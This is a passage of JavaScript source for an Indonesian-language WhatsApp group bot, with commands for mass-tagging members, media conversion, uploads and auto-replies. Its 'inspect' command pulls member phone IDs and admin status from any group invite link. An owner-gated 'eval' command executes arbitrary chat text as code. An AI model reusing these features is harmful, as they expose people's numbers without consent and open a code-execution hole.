            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "tomp4":
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          ger = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await syaa.downloadAndSaveMediaMessage(ger);
          webp2mp4File(owgi).then((res) => {
            sendMediaURL(from, res.result, "Done");
          });
        } else {
          reply("reply stiker");
        }
        fs.unlinkSync(owgi);
        break;
      case "tourl":
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedVideo) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedVideo
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          owgi = await syaa.downloadMediaMessage(boij);
          res = await upload(owgi);
          reply(res);
        } else {
          reply("kirim/reply gambar/video");
        }
        break;
      case "inspect":
        if (isBanned) return reply(mess.ban)
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          if (!q) return reply("masukan link wa");
          cos = args[0];
          var net = cos.split("https://chat.whatsapp.com/")[1];
          if (!net) return reply("pastikan itu link https://whatsapp.com/");
          jids = [];
          let {
            id,
            owner,
            subject,
            subjectOwner,
            desc,
            descId,
            participants,
            size,
            descOwner,
            descTime,
            creation,
          } = await syaa.query({
            json: ["query", "invite", net],
            expect200: true,
          });
          let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split("@")[0]}` : "*Owner* : -"}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : "*Desc* : tidak ada"}
*Id desc* : ${descId}
${
  descOwner
    ? `*Desc diubah oleh* : @${descOwner.split("@")[0]}`
    : "*Desc diubah oleh* : -"
}\n*Tanggal* : ${
            descTime ? `${formatDate(descTime * 1000)}` : "-"
          }\n\n*Kontak yang tersimpan*\n`;
          for (let y of participants) {
            par += `> @${y.id.split("@")[0]}\n*Admin* : ${
              y.isAdmin ? "Ya" : "Tidak"
            }\n`;
            jids.push(`${y.id.replace(/@c.us/g, "@s.whatsapp.net")}`);
          }
          jids.push(
            `${owner ? `${owner.replace(/@c.us/g, "@s.whatsapp.net")}` : "-"}`
          );
          jids.push(
            `${
              descOwner
                ? `${descOwner.replace(/@c.us/g, "@s.whatsapp.net")}`
                : "-"
            }`
          );
          syaa.sendMessage(from, par, text, {
            quoted: mek,
            contextInfo: { mentionedJid: jids },
          });
        } catch {
          reply("Link error");
        }
        break;
        //Auto respon tesy
        if (budy.includes("test")){
	         reply("memek amat gak work")
        }            
if (budy.startsWith('@6283102774416')){
result = fs.readFileSync(`./strg/stiker/saya.webp`)
  syaa.sendMessage(from, result, sticker, { quoted: mek })
                  }
case "P":
      reply("Salam kak:)")
  break               
case "cape":
case "Cape":
case "lelah":
case "Lelah":
case "bosen":
case "Bosen":
case "sad":
case "Sad":
case "sedih":
case "Sedih":
case ":)":
case "gpp":
case "Gpp":
case "capek":
case "Capek":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/yy.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

      reply("Nih 🗿 https://www.mediafire.com/file/nssebae7dxlhfa8/DATA+BASE+ITEM+GT+BY+KY.txt/file")
        break

        case "lambangcc":
        case "bagilambang":
      reply("•💹🏴󠁧󠁢󠁳󠁣󠁴󠁿")
        break       
        //Akhir
      case "eval":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        syaa.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(5)), null, "\t"),
          text,
          { quoted: mek }
        );
        break;
      default:
        }
                  
    if (isGroup && budy != undefined) {
    } else {
      console.log(
        color("[TEXT]", "red"),
        "SELF-MODE",
        color(sender.split("@")[0])
      );
    }
  } catch (e) {
    e = String(e);
    if (!e.includes("c.isZero") && !e.includes("jid")) {
      console.log("Message : %s", color(e, "green"));
    }
    // console.log(e)
  }
};
